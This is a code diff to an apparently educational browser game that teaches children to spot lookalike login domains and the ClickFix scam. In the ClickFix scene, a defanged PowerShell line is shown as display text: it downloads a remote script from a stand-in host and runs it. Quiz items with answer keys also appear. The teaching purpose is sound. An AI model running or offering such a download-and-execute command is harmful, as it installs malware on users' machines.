@@ -5,14 +5,18 @@
 
   // pre + dom (domínio que realmente manda) + pos
   const URLS = [
+    { pre: 'accounts.', dom: 'google.com', pos: '/signin', v: true, ex: 'Domain <b>google.com</b>: the real one.' },
     { pre: 'accounts.google.com.', dom: 'secure-login.net', pos: '/signin', v: false, ex: 'The domain is <b>secure-login.net</b>. Everything to its left is decoration.' },
-    { pre: 'accounts.', dom: 'google.com', pos: '/', v: true, ex: 'Domain <b>google.com</b>: this is the real one.' },
-    { pre: 'google.', dom: 'account-verify.com', pos: '/', v: false, ex: 'The domain is <b>account-verify.com</b>, not Google.' },
-    { pre: 'accounts.', dom: 'goog1e.com', pos: '/', v: false, ex: 'The number <b>"1"</b> instead of the letter <b>"l"</b>: goog1e.com.' }
+    { pre: '', dom: 'accounts-google.com', pos: '/signin', v: false, ex: 'A hyphen makes it a different domain: <b>accounts-google.com</b> is not google.com.' },
+    { pre: 'accounts.', dom: 'googIe.com', pos: '/signin', v: false, ex: 'A capital <b>I</b> instead of a small <b>l</b>: googIe.com. In many fonts they look the same.' },
+    { pre: 'stnicholas.', dom: 'managebac.com', pos: '/login', v: true, ex: 'Domain <b>managebac.com</b>, with the school\'s name in front: the real ManageBac.' },
+    { pre: '', dom: 'stnicholas-managebac.com', pos: '/login', v: false, ex: 'The school\'s name stuck to "managebac" with a hyphen: <b>stnicholas-managebac.com</b> is someone else\'s site.' }
   ];
+  // a ordem das opções muda a cada vez: a resposta certa não pode ser sempre a última
+  function embaralhar(a) { const b = a.slice(); for (let i = b.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [b[i], b[j]] = [b[j], b[i]]; } return b; }
 
   M.registrar({
-    ordem: 7, id: 'navegador', hora: '15:00', titulo: 'Browse safely', tema: 'Fake websites', icone: 'globo', max: 30,
+    ordem: 7, id: 'navegador', hora: '15:00', titulo: 'Browse safely', tema: 'Fake websites', icone: 'globo', max: 40,
     missao: 'Fake websites have a padlock too. First, <strong>sort the real addresses from the fake ones</strong>. Then open a link a classmate sent.',
     como: [
       ['lupa', 'Read the address from right to left, starting at the first "/".'],
@@ -24,11 +28,11 @@
       'What counts is the <b>domain just before the first "/"</b>. Check it letter by letter: "1" and "l" look almost the same.',
       'No "are you human?" check ever asks you to press keys like <b>Windows + R</b> and paste something. That installs a virus: close the page and tell an adult.'
     ],
-    conquista: { id: 'endereco', nome: 'Address checker', desc: 'Got all 4 addresses right and did not paste the command', icone: 'globo' },
+    conquista: { id: 'endereco', nome: 'Address checker', desc: 'Got all 6 addresses right and did not paste the command', icone: 'globo' },
 
     iniciar(api) {
       const marc = {};
-      api.raiz.innerHTML = '<div class="f7"><div class="topo"><h3>You want to sign in to your school Google account</h3><p>Every address has a padlock. Which ones are real?</p></div>' +
+      api.raiz.innerHTML = '<div class="f7"><div class="topo"><h3>Signing in to your school accounts</h3><p>Every address has a padlock. Which ones really are Google and ManageBac?</p></div>' +
         '<div class="urls">' + URLS.map((u, k) =>
           '<div class="url-linha" data-k="' + k + '" style="animation-delay:' + k * 0.08 + 's"><div class="barra-url">' + ico('cadeado') + '<span class="u"><span class="dim">https://</span>' + u.pre + '<mark>' + u.dom + '</mark>' + u.pos + '</span></div>' +
           '<div class="toggle"><button type="button" class="v" data-v="1">Real</button><button type="button" class="f" data-v="0">Fake</button></div>' +
@@ -88,11 +92,12 @@
             '<li>Press <kbd>Windows</kbd> + <kbd>R</kbd></li><li>Press <kbd>Ctrl</kbd> + <kbd>V</kbd></li><li>Press <kbd>Enter</kbd></li></ol></div>');
           api.som('notif');
           f.querySelector('.ctx').innerHTML = '<b>The check wants more.</b>Three key presses to "prove you are human". What do you do?';
-          const ops = [
-            { t: 'Follow the 3 steps: it is only a check', ok: false },
+          const ops = embaralhar([
+            { t: 'Follow the 3 steps: it is only a check', ok: false, rodou: true },
             { t: 'Do only step 1, to see what happens', ok: false },
-            { t: 'Close the page and tell an adult', ok: true }
-          ];
+            { t: 'Close the page and tell an adult', ok: true },
+            { t: 'Try the steps on a school computer instead, where it is safer', ok: false, rodou: true }
+          ]);
           const box = f.querySelector('.opcoes');
           box.innerHTML = ops.map((o, k) => '<button class="opcao" type="button" style="animation-delay:' + k * 0.08 + 's"><span class="tecla">' + (k + 1) + '</span><span>' + o.t + '</span></button>').join('');
           const bts = Array.from(box.querySelectorAll('button'));
@@ -109,12 +114,12 @@
             } else {
               api.erro(bts[k]);
               f.querySelector('.pagina').insertAdjacentHTML('beforeend', '<div class="executar"><div class="tt">Run</div><div class="cp">' +
-                (k === 0 ? 'Open:' : 'Type the name of a program... or paste:') + '<div class="campo">powershell -w hidden -c "iwr hxxps://cdn-verifica[.]top/c.ps1 | iex"</div>' +
-                '<div style="color:#cf4a3c;margin-top:10px;font-weight:600">' + (k === 0 ? 'Done. A harmful program was downloaded and installed.' : 'The command is already copied. Ctrl + V and Enter would have finished the job.') + '</div></div></div>');
+                (o.rodou ? 'Open:' : 'Type the name of a program... or paste:') + '<div class="campo">powershell -w hidden -c "iwr hxxps://cdn-verifica[.]top/c.ps1 | iex"</div>' +
+                '<div style="color:#cf4a3c;margin-top:10px;font-weight:600">' + (o.rodou ? 'Done. A harmful program was downloaded and installed.' : 'The command is already copied. Ctrl + V and Enter would have finished the job.') + '</div></div></div>');
               await api.espera(1600);
             }
             await api.feedback({
-              tipo: o.ok ? 'ok' : 'erro', titulo: o.ok ? 'Page closed, scam avoided!' : (k === 0 ? 'You installed the virus.' : 'That was close!'),
+              tipo: o.ok ? 'ok' : 'erro', titulo: o.ok ? 'Page closed, scam avoided!' : (o.rodou ? 'You installed the virus.' : 'That was close!'),
               texto: '<p>' + (o.ok ? 'No real website asks you to open Windows "Run" and paste something.' :
                 'When you clicked the box, the page copied a command to your clipboard. The "steps" get you to open Run and start that command yourself.') + '</p>',
               caso: '<b>This trick has a name: ClickFix.</b> It works on any computer because nothing needs to be broken: the victim runs the command themselves. On a Mac it may ask you to open Terminal instead. Saw a request like this? Close the page, run nothing and tell an adult.',
